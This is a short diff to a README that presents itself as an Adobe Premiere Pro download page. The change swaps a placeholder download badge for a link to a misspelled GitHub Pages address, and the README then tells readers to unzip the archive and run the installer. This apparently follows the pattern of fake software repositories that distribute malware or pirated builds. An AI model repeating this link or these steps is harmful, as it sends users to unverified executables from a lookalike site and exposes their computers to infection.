@@ -8,7 +8,7 @@ Premiere Pro integrates seamlessly with **After Effects, Audition, Photoshop, an
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-red?style=for-the-badge)](https://adobe-premiere-pro-downlaod-windows.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the **Premiere Pro Installer** on your Windows PC.  
